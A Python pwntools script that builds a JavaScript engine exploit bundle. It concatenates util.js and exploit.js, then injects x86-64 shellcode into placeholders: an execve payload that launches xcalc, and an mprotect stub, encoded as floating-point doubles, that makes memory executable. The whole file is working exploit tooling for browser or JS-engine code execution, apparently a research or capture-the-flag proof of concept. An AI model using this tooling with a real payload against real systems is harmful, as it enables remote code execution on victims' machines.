import argparse
from pwn import *

context(arch='amd64', os='linux')
DEBUG = False

def add_shellcode(js_code):
    EGG = "/* SHELLCODE_GOES_HERE */"
    cmd = '/usr/bin/xcalc'
    shellcode = asm(shellcraft.execve(cmd, 0, ["DISPLAY=:0"]))
    shellcode = ", ".join([f"0x{b:02x}" for b in shellcode])
    return js_code.replace(EGG, shellcode)

def add_mprotect(js_code):
    new_script = ""
    shellcode  = b"FINDME1!"
    shellcode += b"FINDME2!"
    shellcode += asm(f"""
    inst0:
        {"int3" if DEBUG else "nop"}
        mov rdi, [rdx+8]
        mov esi, 0x1000
        mov edx, 7
        mov eax, SYS_mprotect
        syscall
        ret
    """)
    shellcode += b"\x90"*(8 - len(shellcode) % 8)
    for i in range(0, len(shellcode), 8):
        val = struct.unpack("<d", shellcode[i:i+8])[0]
        idx = i // 8
        new_script += f"{val}, "
    EGG = "/* MPROTECTOR_GOES_HERE */"
    return js_code.replace(EGG, new_script)

def combine_files(output_file, util_file, exploit_file):
    ret = ""
    ret += "// This file is generated by Python script\n"
    ret += "/" * 100 + '\n'
    ret += "// util.js\n\n"

    with open(util_file, 'r') as util:
        ret += util.read()

    ret += "\n" + "/" * 100 + '\n'
    ret += "// exploit.js\n\n"

    with open(exploit_file, 'r') as exploit:
        ret += exploit.read()

    return ret

def generate_bundle(output_file, util_file, exploit_file):
    data = combine_files(output_file, util_file, exploit_file)
    data = add_shellcode(data)
    data = add_mprotect(data)
    with open(output_file, 'w') as bundle_file:
        bundle_file.write(data)

def main():
    parser = argparse.ArgumentParser(description='Generate a bundled JavaScript file.')
    parser.add_argument('output_file', help='Output file name')
    parser.add_argument('util_file', help='Path to util.js file')
    parser.add_argument('exploit_file', help='Path to exploit.js file')
    
    args = parser.parse_args()

    generate_bundle(args.output_file, args.util_file, args.exploit_file)
    print(f'Bundled file generated: {args.output_file}')

if __name__ == "__main__":
    main()
